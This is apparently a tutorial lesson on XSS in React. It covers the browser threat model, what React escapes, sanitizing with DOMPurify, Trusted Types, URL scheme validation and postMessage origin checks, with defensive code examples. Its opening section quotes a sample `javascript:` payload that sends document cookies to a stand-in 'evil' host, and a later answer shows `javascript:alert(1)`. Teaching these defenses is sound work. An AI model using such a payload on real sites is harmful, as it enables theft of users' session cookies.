---
title: The browser threat model and XSS in React
tech: React 19.2, DOMPurify, Trusted Types
version: React 19.2, DOMPurify 3.x
date: 2026-11-09
covers: [1, 2, 4]
---
# The browser threat model and XSS in React
[← Overview](00-overview.md)

## Why it matters
- Product reviews support "rich text"; a review renders through `dangerouslySetInnerHTML` and runs a script for every visitor of that product.
- A profile "website" field is rendered as `<a href={user.website}>`; `javascript:fetch('//evil/?c='+document.cookie)` is stored and clicked by an admin.
- A `postMessage` listener accepts messages from any origin and writes them into the DOM.

## Concepts

### The browser threat model
| Threat | How | Main defense |
|:--|:--|:--|
| ⭐ XSS | attacker script runs in your origin | React escaping, no raw HTML, CSP, Trusted Types |
| CSRF | another site triggers credentialed requests | `SameSite` cookies + antiforgery in ASP.NET Core (01-foundations/06) |
| clickjacking | your page framed and overlaid | `frame-ancestors 'none'` (lesson 02) |
| supply chain | malicious npm package or third-party script | lock files, audits, SRI, CSP allowlists |
| open redirect | `?returnUrl=https://evil` | allowlist redirects (lesson 04) |
| data exposure | secrets in bundles or RSC payload | `server-only`, DTOs (lesson 04) |

### What React escapes
| Context | React | Safe? |
|:--|:--|:--|
| `{text}` in JSX | escaped as text | ✓ |
| attribute values `title={x}` | escaped | ✓ |
| `href={url}` / `src={url}` | escaped, but `javascript:` is a valid URL | ⚠ validate scheme (React 19 blocks `javascript:` in production) |
| `dangerouslySetInnerHTML` | raw HTML | ✗ sanitize first |
| `ref.current.innerHTML = x` | raw DOM | ✗ |
| `style={{ background: \`url(${x})\` }}` | CSS injection risk | ⚠ validate |
| server-rendered JSON in `<script>` | must escape `</script>` | use framework helpers |

### When you must render HTML
Prefer Markdown → React elements (`react-markdown` with no raw HTML) or a structured format from the API. If HTML is unavoidable (CMS content), sanitize with DOMPurify on the client or, better, sanitize on the server before storing (the ASP.NET Core API can use `HtmlSanitizer` from NuGet). Do both for defense in depth.

### Trusted Types
A CSP directive (`require-trusted-types-for 'script'`) that makes DOM sinks (`innerHTML`, `eval`-like APIs) reject plain strings. Only values created by an approved policy pass. It turns many XSS bugs into errors.

## Example
`web/src/lib/safe-url.ts`
```ts
const allowed = new Set(["https:", "http:", "mailto:"]);

export function safeHref(input: string | null | undefined): string | undefined {
  if (!input) return undefined;
  try {
    const url = new URL(input, "https://roastery.test");
    return allowed.has(url.protocol) ? url.toString() : undefined;
  } catch {
    return undefined;
  }
}
// <a href={safeHref(user.website)} rel="noopener noreferrer ugc">{user.website}</a>
```
`web/src/features/reviews/ReviewBody.tsx`
```tsx
"use client";
import DOMPurify from "dompurify";

const config = { ALLOWED_TAGS: ["p", "br", "strong", "em", "ul", "ol", "li"], ALLOWED_ATTR: [] };

export function ReviewBody({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, { ...config, RETURN_TRUSTED_TYPE: true }) as unknown as string;
  return <div className="prose" dangerouslySetInnerHTML={{ __html: clean }} />;
}
```
Safer still: the API returns review text as plain text or Markdown, and the frontend renders it as text.

`postMessage` handling:
```ts
window.addEventListener("message", (e) => {
  if (e.origin !== "https://pay.example") return;          // check the sender
  const data = PaymentResult.safeParse(e.data);             // validate the shape
  if (data.success) handlePayment(data.data);
});
```

## Production patterns
- No `dangerouslySetInnerHTML` without sanitization and a code-review comment explaining why.
- Validate URL schemes for any user-supplied link or image source.
- Sanitize rich text on the server when it's stored and again before rendering.
- CSP with nonces and (where supported) Trusted Types as the safety net (lesson 02).

## Mistakes
Wrong:
```tsx
<div dangerouslySetInnerHTML={{ __html: review.body }} />
```
Right: render as text, or sanitize with a strict allowlist.

Wrong: `<a href={user.website}>`.
Right: `<a href={safeHref(user.website)} rel="noopener noreferrer ugc">`.

## Check yourself
1. Which React escape hatches can lead to XSS?
2. Why does a `javascript:` URL in `href` matter even though React escapes attributes?
3. What does Trusted Types change for `innerHTML`?

<details><summary>Answers</summary>

1. `dangerouslySetInnerHTML`, direct DOM writes via refs (`innerHTML`), unvalidated URLs in `href`/`src`, and injecting into styles or scripts.
2. Escaping keeps the attribute value intact; `javascript:alert(1)` is a valid value that executes when clicked.
3. Assigning a plain string throws; only `TrustedHTML` created by an approved policy (like DOMPurify's) is accepted.
</details>

## Sources
- [OWASP — XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [react.dev — dangerouslySetInnerHTML](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [MDN — Trusted Types](https://developer.mozilla.org/docs/Web/API/Trusted_Types_API)
- [HtmlSanitizer (.NET)](https://github.com/mganss/HtmlSanitizer)
